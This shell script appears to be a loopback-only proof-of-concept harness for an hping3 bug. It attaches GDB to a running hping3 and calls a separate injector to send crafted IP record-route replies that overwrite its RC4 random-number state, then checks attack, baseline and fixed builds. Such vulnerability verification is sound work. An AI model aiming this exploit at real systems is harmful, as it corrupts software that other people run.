#!/bin/sh
# clang -O0 build: crafted RR reply sets hp_rand.i/hp_rand.j and fills rc4_sbox.
# Loopback only: 127.0.0.x probes on lo; GDB only reads live state.
# BIN=... EXPECT=attack|baseline|fixed FILL=.. I0=.. J0=..
set -u
cd "$(dirname "$0")" || exit 1
mkdir -p evidence
PIN=e8ef2dd63b3f7b5e5d87d14a50bdc64c6befc94a8e21801f060708f2dcbb5e7b
FIX=70f0112d12c52d8661736de85e1a5155ba717ca63b09b471cb7aaa7f0ba846c7
BIN=${BIN:-clang-src/hping3}
EXPECT=${EXPECT:-attack}
FILL=${FILL:-0}
I0=${I0:-32}
J0=${J0:-128}
RUN_TAG=${RUN_TAG:-$EXPECT}
[ -x "$BIN" ] || { echo "$BIN missing"; exit 2; }
src="${BIN%/hping3}/display_ipopt.c"
sha=$(sha256sum "$src" | cut -d' ' -f1)
if [ "$EXPECT" = fixed ]; then
    [ "$sha" = "$FIX" ] || { echo "fixed source hash mismatch: $sha"; exit 2; }
else
    [ "$sha" = "$PIN" ] || { echo "pinned source hash mismatch: $sha"; exit 2; }
fi

tag="$RUN_TAG"
run="evidence/ij-$tag-run.out"
gd="evidence/ij-$tag-gdb.out"
cfg="evidence/ij-$tag.gdb"
pidf="evidence/ij-$tag.pid"
sudo -n rm -f "$pidf" "$run" "$gd"
: > "$run"; : > "$gd"

sudo -n sh -c "echo \$\$ > '$PWD/$pidf'; exec '$PWD/$BIN' -D -1 -G --rand-dest -I lo -c 24 -i 1 127.0.0.x" \
    > "$run" 2>&1 &
hp=$!
pid=0
for x in 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15; do
    [ -s "$pidf" ] && break
    sleep 0.1
done
pid=$(cat "$pidf" 2>/dev/null || echo 0)
[ "$pid" -gt 0 ] || { echo "no hping pid"; kill "$hp" 2>/dev/null; exit 2; }
sym() { nm -n -S --defined-only "$BIN" | awk -v s="$1" '$4==s {print $1; exit}'; }
mapline=$(sudo -n awk '$3=="00000000" {print $1; exit}' "/proc/$pid/maps")
base="0x${mapline%%-*}"

il=$(sym hp_rand.i); jl=$(sym hp_rand.j); sl=$(sym rc4_sbox)
[ -n "$il" ] && [ -n "$jl" ] && [ -n "$sl" ] || { echo "no rng symbols"; exit 2; }
ii=$(printf '0x%x' $((base + 0x$il)))
jj=$(printf '0x%x' $((base + 0x$jl)))
sb=$(printf '0x%x' $((base + 0x$sl)))
cat > "$cfg" <<EOF
set pagination off
set confirm off
file $PWD/$BIN
break select_next_random_dest
commands
silent
printf "STATE hit\n"
printf "IP\n"
x/wx $ii
printf "JP\n"
x/wx $jj
printf "SP\n"
x/256xb $sb
continue
end
attach $pid
c
EOF
echo "tag=$tag pid=$pid base=$base i=$ii j=$jj sbox=$sb"

timeout 30 sudo -n gdb -q -batch -x "$cfg" > "$gd" 2>&1 &
gp=$!
sleep 4
if [ "$EXPECT" = baseline ]; then
    echo "baseline: no crafted frames"
elif [ "$EXPECT" = fixed ]; then
    sudo -n python3 inject_rr_ij.py --pid "$pid" --ptr 255 --rr-len 255 \
        --i0 "$I0" --j0 "$J0" --fill "$FILL" --count 3 --gap 0.15
else
    sudo -n python3 inject_rr_ij.py --pid "$pid" --ptr 255 --rr-len 255 \
        --i0 "$I0" --j0 "$J0" --fill "$FILL" --count 3 --gap 0.15
fi
wait "$gp"
kill "$hp" 2>/dev/null
wait "$hp" 2>/dev/null

python3 check_ij.py "$gd" "$run" --fill "$FILL" --i0 "$I0" --j0 "$J0" \
    --expect "$EXPECT" > "evidence/ij-$tag-proof.out"
cat "evidence/ij-$tag-proof.out"
grep -q 'IJ SUMMARY: .* PASS' "evidence/ij-$tag-proof.out" && exit 0 || exit 1
